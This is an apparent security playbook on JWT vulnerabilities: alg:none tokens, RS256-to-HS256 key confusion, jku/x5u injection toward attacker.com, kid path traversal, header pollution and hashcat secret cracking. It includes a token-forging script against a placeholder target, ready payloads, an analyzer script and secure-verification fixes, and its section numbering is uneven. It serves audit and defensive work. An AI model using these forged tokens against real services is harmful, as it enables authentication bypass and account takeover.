# JWT — Algorithm Confusion & Attacks

**Tags:** #high #jwt #authentication #token #algorithm-confusion
**OWASP:** A07:2021 Identification and Authentication Failures
**CVSS Base:** 8.1 (High)

---

## 📖 What is it

JSON Web Tokens (JWT) are stateless authentication tokens. Vulnerabilities arise when the server does not correctly validate the signing algorithm or accepts manipulated tokens as valid.

---

## 🔍 `grep_search` Tactics

```
jwt.sign(
jwt.verify(
JWT.decode(
JwtBuilder
decode(token
verify(token
jsonwebtoken
jjwt
PyJWT
jose
jku
x5u
jwks_uri
kid
ES256
ES512
```

---

## 💣 Attacks by Category

### 1. `alg: none` Bypass

**How it works:** some servers accept tokens with `alg: none` in the header, treating the signature as optional.

```
Original header:  {"alg":"HS256","typ":"JWT"}
Malicious header: {"alg":"none","typ":"JWT"}

Edited payload:   {"sub":"admin","role":"superuser"}
Signature:        empty (removed)

Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ.
```

**Static detection:** Does the server enforce the accepted algorithm?
```javascript
//  VULNERABLE — accepts the alg from the token itself
jwt.verify(token, secret);

//  CORRECT — enforces the algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

---

### 2. Algorithm Confusion (RS256 to HS256)
**How it works:** The attacker changes the algorithm in the header from RS256 (asymmetric) to HS256 (symmetric). If the server uses the same verification function for both and passes the PUBLIC key as the secret for HS256, the attacker can sign their own tokens using the public key (which is often public).
**Tactic:** Try signing the token with the public key (extracted from `.well-known/jwks.json`) using HS256.

```
Condition: server accepts HS256 even when configured for RS256
Attack: sign token with HMAC-SHA256 using the RSA public key as the secret
```

```python
# .tmp/jwt_confusion.py
import jwt
import requests

# Public key obtained from /api/.well-known/jwks.json or /.well-known/openid-configuration
public_key = open("public.pem").read()

# Forge token as admin using the public key as HMAC secret
forged = jwt.encode(
    {"sub": "1337", "role": "admin"},
    public_key,
    algorithm="HS256"
)

r = requests.get("http://target.com/api/admin", headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.text[:200])
```

---

### 2.5. ECC (Elliptic Curve) Key Confusion

**How it works:** Similar to RSA→HMAC confusion, but targeting Elliptic Curve algorithms (ES256, ES512). Some libraries confuse the ECC Public Key structure with an HMAC secret if the `alg` is switched.
**Attack:** 
1. Obtain the ECC Public Key (`x` and `y` coordinates).
2. Attempt to sign the token with `HS256` using the raw public key bytes as the secret.
3. Check if the server accepts the forged token.

---

### 2.6. JKU / X5U Header Injection

**How it works:** `jku` (JWK Set URL) and `x5u` (X.509 URL) headers tell the server where to fetch the public key for verification.
**Attack:** 
1. Host your own malicious JWKS on a public server.
2. Inject the `jku` header in the JWT pointing to your URL: `{"alg":"RS256","jku":"https://attacker.com/keys.json"}`.
3. If the server fetches and trusts your key without a whitelist check, you can sign any token.

**Static Detection:** Search for usage of `jku` or `x5u` in verification logic without explicit URL filtering.

---

### 2.7. KID (Key ID) Path Traversal
**How it works:** The `kid` header identifies which key to use. If the server uses the `kid` to fetch a file from the filesystem, an attacker can use path traversal to point to a known file.

**Attack:**
1. Set `kid` to `/dev/null`. If the server reads this as the secret, the secret becomes an empty string. Sign your token with an empty secret.
2. Set `kid` to a known public file like `config.json`. If the server uses the file content as a secret, you can reproduce the signature.

**Payload:** `{"alg":"HS256","kid":"../../../../dev/null"}`

---

### 2.8. JWT Header Parameter Pollution (HPP)
**How it works:** Some libraries only check the first occurrence of a header, while others check the last. By providing duplicate keys, you can bypass specific security checks.

**Payload:** `{"alg":"RS256", "alg":"HS256"}` -> If WAF sees RS256 and App sees HS256, confusion occurs.
---

### 4. Missing `exp` or Excessive Expiration

```python
#  VULNERABLE — no expiration
token = jwt.encode({"sub": user_id, "role": "admin"}, secret)

#  CORRECT — short expiration
from datetime import datetime, timedelta, timezone
token = jwt.encode({
    "sub": user_id,
    "exp": datetime.now(timezone.utc) + timedelta(hours=1)
}, secret, algorithm="HS256")
```

---

### 4. Sensitive Data in the Payload

> JWT is not encrypted by default — only signed. The payload is Base64-decodable by anyone.

```bash
# Decode payload without special tools
echo "eyJzdWIiOiIxMjM0IiwicGFzc3dvcmQiOiJzZWNyZXQifQ==" | base64 -d
# → {"sub":"1234","password":"secret"}    EXPOSED
```

**Detection:** check whether fields like `password`, `credit_card`, `ssn`, `private_key` are present in the claims.

---

### 5. Weak Key (Offline Brute Force)

If the algorithm is HS256 with a weak secret, the token can be cracked offline:

```bash
# Using hashcat
hashcat -a 0 -m 16500 eyJ...token...Here /usr/share/wordlists/rockyou.txt

# Using jwt-cracker
jwt-cracker eyJ...token...Here wordlist.txt
```

---

## 🛠️ JWT Analysis Script

```python
# .tmp/analyze_jwt.py
import base64, json, sys

def decode_part(part):
    # Padding fix
    padded = part + '=' * (4 - len(part) % 4)
    return json.loads(base64.b64decode(padded))

token = sys.argv[1] if len(sys.argv) > 1 else input("JWT Token: ")
parts = token.split('.')

if len(parts) != 3:
    print("[WARN] Malformed token or missing signature (alg:none candidate?)")
else:
    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    sig_len = len(parts[2])
    
    print(f"\n📋 HEADER: {json.dumps(header, indent=2)}")
    print(f"\n📦 PAYLOAD: {json.dumps(payload, indent=2)}")
    print(f"\n🔑 Signature present: {'YES' if sig_len > 0 else '🚨 NO (alg:none candidate!)'}")
    
    # Alerts
    if header.get('alg') == 'none':
        print("\n🚨 CRITICAL: alg=none detected!")
    if 'exp' not in payload:
        print("\n⚠️  HIGH: no exp field → token never expires!")
    if 'password' in payload or 'secret' in payload:
        print("\n⚠️  MEDIUM: sensitive data in payload!")
```

---

## 🛡️ Fix

```javascript
//  Node.js — secure validation
const jwt = require('jsonwebtoken');

// Fix algorithm, verify issuer and audience
const payload = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'],
  issuer: 'myapp.com',
  audience: 'myapp-users'
});
```

```python
#  Python — secure PyJWT
import jwt
payload = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],    # explicit list, never omit
    options={"require": ["exp", "iat", "sub"]}
)
```

---

## 🔗 Chain Exploits

```
JWT Algorithm Confusion → Total Admin Takeover
JWT without exp + XSS → Stolen token has infinite validity
JWT payload with sensitive data + MitM → Credential exposure
```

---

## 📌 References
- [[oauth-2.0-saml-protocol-attacks]]
- [[authentication-session-management]]
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)